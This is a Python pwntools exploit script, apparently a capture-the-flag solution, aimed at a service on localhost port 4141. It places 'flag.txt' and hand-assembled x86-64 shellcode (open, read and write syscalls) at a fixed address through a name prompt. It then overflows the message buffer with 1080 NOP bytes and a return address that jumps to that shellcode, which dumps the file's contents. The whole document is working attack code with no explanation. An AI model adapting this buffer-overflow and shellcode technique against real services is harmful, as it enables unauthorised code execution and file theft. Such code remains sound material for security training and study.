#!/usr/bin/python

from pwn import *

context.os = "linux"
context.bits = 64 

def gen_payload():
    payload = asm("mov rdi, 0x4040c0")
    payload += asm("xor rax, rax")
    payload += asm("add al, 2")
    payload += asm("xor rsi, rsi")
    payload += asm("syscall")
    payload += asm("sub sp, 0xfff")
    payload += asm("lea rsi, [rsp]")
    payload += asm("mov rdi, rax")
    payload += asm("xor rdx, rdx")
    payload += asm("mov dx, 0xfff")
    payload += asm("xor rax, rax")
    payload += asm("syscall")
    payload += asm("xor rdi, rdi")
    payload += asm("add dil, 4")
    payload += asm("mov rdx, rax")
    payload += asm("xor rax, rax")
    payload += asm("add al, 1")
    payload += asm("syscall")
    return payload

def exploit():
    r = remote("localhost", 4141)
    r.recvuntil("Enter your name>")
    r.sendline("flag.txt" + "\x00" + gen_payload())
    r.recvuntil("Enter message>")
    r.sendline(1080*'\x90' + p64(0x4040c0 + len("flag.txt") + 1))
    for i in range(3):
        log.info(r.recv())

def main():
    exploit()

if __name__=="__main__":
    main()
